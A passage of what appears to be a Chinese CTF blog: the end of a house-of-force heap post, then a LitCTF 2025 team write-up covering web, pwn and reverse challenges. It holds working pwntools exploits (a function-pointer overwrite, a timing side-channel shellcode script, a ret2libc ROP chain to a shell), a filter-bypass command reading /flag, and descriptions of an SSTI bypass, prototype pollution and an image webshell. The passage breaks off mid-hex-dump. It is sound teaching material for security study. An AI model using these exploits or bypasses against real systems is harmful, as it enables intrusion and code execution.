\</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>
<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
<h4 id="题目分析">题目分析</h4>
<h5 id="hitcontraning_lab11">hitcontraning_lab11</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
                      class=""
                >
<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
                      class=""
                >
<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double
free，不过显然house_of_force更快更方便。</p>
<p>先把板子套上：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>具体打法：</p>
<p>首先溢出改top chunk的size域</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
                      class=""
                >
<p>然后算出偏移后申请一个目标大小的chunk</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
                      class=""
                >
<p>此时我们发现top
chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>litctf2025 writeup</title>
    <url>/blog/2025/05/26/litctf2025-writeup/</url>
    <content><![CDATA[<h2 id="initializaion战队wp">Initializaion战队WP</h2>
<p>排名34，队员collectcrop，w2194167366，cjyxx</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185015948.png"
                      class=""
                >
<h3 id="web-nest_js">web-nest_js</h3>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525184319479.png"
                      class=""
                >
<p>进入没找到什么有用信息（第一次进的时候这个界面都没加载出来，于是dirsearch扫描了）发现了/login<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185032103.png"
                      class=""
                ></p>
<p>输入东西点立即登录发现没有反应，于是bp抓包查看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185104155.png"
                      class=""
                >
<p>如果用户名或密码错误会显示Invalid
credentials，这里猜测用户就是admin，弱口令爆破密码得到密码为password，点登录拿到flag<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185201124.png"
                      class=""
                ></p>
<p>flag: LitCTF{b11dd2bc-935b-47d7-ada1-dd12a3140c4a}</p>
<h3 id="web-星愿信箱">web-星愿信箱</h3>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185247151.png"
                      class=""
                >
<p>可以写东西，提交会显示要输入文字，于是加上几个字，后面跟上<code>&#123;&#123;7*7&#125;&#125;</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185331896.png"
                      class=""
                ></p>
<p>有waf，所以就是SSTI注入，试试<code>&#123;%print(7*7)%&#125;</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185357871.png"
                      class=""
                ></p>
<p>成功回显，于是输入payload<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185442871.png"
                      class=""
                ></p>
<p>直接输命令即可，这里过滤了cat，使用tac绕过<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185509271.png"
                      class=""
                ></p>
<p>NSSCTF{5f6e362c-81ff-4d9b-9d1f-3d671b45de82}</p>
<h3 id="web-多重宇宙日记">web-多重宇宙日记</h3>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185621187.png"
                      class=""
                >
<p>进来登录发现没用户，直接随便注册一个用户，这里介绍说要成为真正的管理员，题目介绍说了原型链</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185713890.png"
                      class=""
                >
<p>发现能传入json数据</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185742772.png"
                      class=""
                >
<p>抓包发现了json数据的格式，这里打js原型链污染<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185814196.png"
                      class=""
                ></p>
<p>F12发现有提示isAdmin，估计要污染掉它的值改为true，于是payload为<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525190055083.png"
                      class=""
                ></p>
<p>直接发送原始JSON，会发现多出来一个管理员界面<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525190132120.png"
                      class=""
                ></p>
<p>访问拿到flag</p>
<p>NSSCTF{22139e24-4f90-44d7-8730-c30781f8b58c}</p>
<h3 id="web-easy_file">web-easy_file</h3>
<p>进入为一个登录界面，试了下应该又是弱口令爆破，这里传入的数据会被自动base64加密，这个在爆破的时候要注意一下，拿到用户名admin密码password，访问到admin.php为一个文件上传界面<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525221624066.png"
                      class=""
                >，测试发现只能传jpg文件，文件内容过滤了<?php，可以使用短标签<?=绕过<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525221751171.png"
                      class=""
                >，传成功后，注意到初始界面（登录界面)有提示：file查看头像，于是在admin.php界面接上?file=/var/www/html/uploads/1.jpg，成功文件包含图片马<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525221827413.png"
                      class=""
                >，ls发现flag在当前目录，直接cat即可。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525221846326.png"
                      class=""
                ></p>
<p>NSSCTF{2c2659d4-5302-4c73-9ca0-aa0413daf303}</p>
<h3 id="pwn-test_your_nc">pwn-test_your_nc</h3>
<p>签到题，给的附件是一个python脚本，可以直接RCE，只是过滤了一部分命令。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525185205347.png"
                      class=""
                >
<p>这里cat我用变量拼接绕过，空格用$IFS$9绕过，可以直接读取flag。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">a=ca;b=t;$a$b$IFS<span class="variable">$9</span>/flag</span><br></pre></td></tr></table></figure></div>
<h3 id="pwn-shellcode">pwn-shellcode</h3>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525190145815.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525190708482.png"
                      class=""
                >
<p>这道题和ACTF的有道题类似，都是只允许open和read系统调用，但对shellcode本身没有做什么限制，所以可以打一个时间侧信道攻击，去比较读取到的flag的某一位是否与我们指定的值相同，如果相等就进入死循环，否则让程序直接EOF退出。这里存在的一个问题是我们需要一个可写的地址来存我们读取到的flag，由于程序开了PIE也没其它别的漏洞，所以这里我们可以采用<strong>call+pop</strong>的方式来获取到我们可写可执行区域的一个相关的地址，call可以把当前指令的下一个地址入栈，然后pop可以把这个地址赋值给某个寄存器，从而实现得到一个可写的地址，加上一个偏移就可以确保其不会覆盖我们要执行的代码。</p>
<p>我这里采用的是直接线性搜索找flag，也可以考虑用二分查找提高搜索效率。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call get_rip</span></span><br><span class="line"><span class="string">    get_rip:</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    add rbx, 0x200</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rcx, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rcx </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 0x2</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rbx</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, rbx</span></span><br><span class="line"><span class="string">    mov rdx, 0xCC</span></span><br><span class="line"><span class="string">    mov al, 0xDD</span></span><br><span class="line"><span class="string">    .L1:</span></span><br><span class="line"><span class="string">    cmp al, byte ptr [rdi+rdx]</span></span><br><span class="line"><span class="string">    je .L1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_search</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> test_guess(index, guess):</span><br><span class="line">            <span class="keyword">return</span> guess</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">shellcode, offset_index, offset_guess, index, guess</span>):</span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"></span><br><span class="line">    shellcode[offset_index] = index</span><br><span class="line">    shellcode[offset_guess] = guess</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(shellcode)</span><br><span class="line"></span><br><span class="line">base_shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(base_shellcode)</span><br><span class="line">OFFSET_INDEX = base_shellcode.find(p8(<span class="number">0xCC</span>))</span><br><span class="line">OFFSET_GUESS = base_shellcode.find(p8(<span class="number">0xDD</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_guess</span>(<span class="params">index, guess</span>):</span><br><span class="line">    <span class="comment"># patch shellcode</span></span><br><span class="line">    shellcode = patch(base_shellcode, OFFSET_INDEX, OFFSET_GUESS, index, guess)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">        sh = remote(<span class="string">&quot;node12.anna.nssctf.cn&quot;</span>,<span class="number">28052</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">b&quot;shellcode: \n&quot;</span>,shellcode)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = sh.recv(timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;index=&#125;</span> <span class="subst">&#123;guess=&#125;</span>]: EOFError -&gt; WRONG&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            <span class="comment"># 卡死（没返回）= 猜对，陷入死循环</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;index=&#125;</span> <span class="subst">&#123;guess=&#125;</span>]: timeout -&gt; CORRECT&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;index=&#125;</span> <span class="subst">&#123;guess=&#125;</span>]: Exception during connection/send -&gt; <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x40</span>):  <span class="comment"># 假设最多 64 字节</span></span><br><span class="line">    ch = linear_search(i)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="number">0</span> <span class="keyword">or</span> ch &gt; <span class="number">0x7f</span>:  <span class="comment"># 不可打印视为终止</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>([ch])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Current flag:&quot;</span>, flag)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure></div>
<h3 id="pwn-master_of_rop">pwn-master_of_rop</h3>
<p>这题乍一看很简单，实则没<strong>pop
rdi;ret</strong>的gadget寸步难行。我们有一个无限制溢出的gets函数，但也仅此而已。我们的难点主要是在于获取libc基址，如果能控制rdi然后再返回到<strong>puts</strong>函数倒是可以直接打印出got表里的libc相关地址。但是我试了很多办法都没能成功的控制rdi而不导致程序崩溃。</p>
<p>依靠着出题人给的提示<strong>ret2gets</strong>这一闻所未闻的利用手法，找到了这样一篇<a class="link" 
 href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#leaking-libc" >优质博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。其原理分析之详细与利用之简洁清晰令人叹为观止。主要的利用方式就是依靠glibc中某些函数实现的锁机制上的漏洞，可以在调用完gets之后在rdi附近残留libc相关地址，其中作者还给出了libc2.37前后两种不同的利用方式。直接照着构造rop链就可以泄露出libc相关地址。两次gets再回来一次put就可以泄露地址，真奇妙！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525190613547.png"
                      class=""
                >
<p>后续有时间再来仔细跟着这篇博客复现一遍这个漏洞发掘的全过程。这里就先直接拿来用了。有了libc基址那就成了最简单的ret2libc了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node8.anna.nssctf.cn&quot;</span>,<span class="number">23662</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x401060</span></span><br><span class="line">gets_plt = <span class="number">0x401080</span></span><br><span class="line">pus_got = <span class="number">0x404018</span></span><br><span class="line">main = <span class="number">0x4011AD</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(gets_plt)*<span class="number">2</span> + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&quot;CCCC&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;tls: <span class="subst">&#123;<span class="built_in">hex</span>(tls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = tls + <span class="number">0x28c0</span></span><br><span class="line">log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line">pop_rdi_ret = libc_addr + <span class="number">0x10f75b</span></span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_add = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">ret = libc_addr + <span class="number">0x2882f</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h3 id="re-easy_rc4">re-easy_rc4</h3>
<p>主函数一看上去就是一个rc4加密输入与指定值比较，key也直接给了，为FenKey!!，那么我们只要进去看看rc4_init和rc4_crypt算法有没有魔改即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525191736969.png"
                      class=""
                >
<p>分析rc4_crypt发现，其相对于普通的rc4加密，最后还多异或了一个0x20，那么这就是一个经简单魔改的rc4加密，可以直接生成keystream，然后异或时除了异或keystream对应位以外，还需要多异或一个0x20回去。rc4解密可以直接调用python的ARC4库实现。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525191853353.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密使用的 key 是前 8 个字节，固定为：</span></span><br><span class="line">key = <span class="string">b&#x27;FenKey!!&#x27;</span></span><br><span class="line"><span class="comment"># 加密结果，也就是程序中的 s2</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;78CC4E1343F47349&quot;</span></span><br><span class="line">    <span class="string">&quot;4F6C4F73C0F4357E&quot;</span></span><br><span class="line">    <span class="string">&quot;CE27764D19607AEA&quot;</span></span><br><span class="line">    <span class="string">&quot;445DC04281DA1CF6&quot;</span></span><br><span class="line">    <span class="string">&quot;647258D994FAF813&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为加密的时候是 RC4 明文 ^ keystream ^ 0x20</span></span><br><span class="line"><span class="comment"># 所以我们先生成 RC4 keystream，然后反推明文</span></span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">keystream = rc4.encrypt(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">40</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密出原始明文（也就是用户应该输入的 flag）</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>([c ^ k ^ <span class="number">0x20</span> <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext, keystream)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered input flag:&quot;</span>, plaintext.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525192411349.png"
                      class=""
                >
<h3 id="re-featureextraction">re-FeatureExtraction</h3>
<p>首先定位到最后验证flag的逻辑，flag长度44，是和v15处的内容进行比较。v11存的是加密后的输入值。前面加密用到了两个函数，其中第二个函数用到了一个前面生成的一个key值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525192642837.png"
                      class=""
                >
<p>实际上我们v15的值和key的值都可以在动态调试中直接dump下来。比如我们可以打个断点在这个用到第三个参数作为key进行加密运算的函数处，这里第三个参数是用r8传递，此时值为0x6AFDE0，然后可以再右下角栈帧中找到这个地址，然后在内存窗口定位到该地址处存的地址。可以看到存的key是LitCTF2025，可以发现这里都是用四个字节存一个值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525193022083.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525193218414.png"
                      class=""
                >
<p>然后dump下来目标的值，在第二个参数rdx处找。然后就可以把值先全部记录到脚本中，后面肯定会用到。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525193459064.png"
                      class=""
                >
<p>然后我们仔细分析sub_4014F0这个加密函数大概干了什么（前面那个函数经分析没啥用处，大概是将输入的格式统一一下）。这里v13和v12大概是输入与key的长度，然后在循环里主要是把input[i]和key[j]乘起来，最后累加到v8数组的i+j下标处。经gpt分析说是典型的多项式乘法，i+j就相当于多项式的某个次数，最后我们返回的值实际上就是v8数组。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525193626627.png"
                      class=""
                >
<p>那么我们就可以相应的写出解密脚本了，可以通过数学关系推导：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">c[i] = p[i]*k₀ + p[i-<span class="number">1</span>]*k₁ + p[i-<span class="number">2</span>]*k₂ + ... + p[i-m]*kₘ</span><br><span class="line">p[i] = (c[i] - (p[i-<span class="number">1</span>]*k₁ + p[i-<span class="number">2</span>]*k₂ + ... + p[i-m]*kₘ)) // k₀</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 还原密文字节（v15 数据）</span></span><br><span class="line">hex_data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">90 16 00 00 58 3E 00 00 F1 6F 00 00 F0 86 00 00</span></span><br><span class="line"><span class="string">66 9D 00 00 30 AB 00 00 71 CA 00 00 29 CF 00 00</span></span><br><span class="line"><span class="string">35 E3 00 00 92 E4 00 00 FD F1 00 00 80 DE 00 00</span></span><br><span class="line"><span class="string">C8 D0 00 00 35 C2 00 00 B5 B9 00 00 CF B1 00 00</span></span><br><span class="line"><span class="string">9F 9E 00 00 86 9E 00 00 B4 96 00 00 50 A5 00 00</span></span><br><span class="line"><span class="string">D3 A0 00 00 35 A1 00 00 CA 99 00 00 C0 AC 00 00</span></span><br><span class="line"><span class="string">78 BE 00 00 96 C1 00 00 00 BC 00 00 C3 B5 00 00</span></span><br><span class="line"><span class="string">F0 B7 00 00 65 B4 00 00 73 B6 00 00 1F B7 00 00</span></span><br><span class="line"><span class="string">E2 BB 00 00 4F CB 00 00 AD D2 00 00 20 DE 00 00</span></span><br><span class="line"><span class="string">94 EC 00 00 30 FC 00 00 B8 04 01 00 EE F6 00 00</span></span><br><span class="line"><span class="string">C9 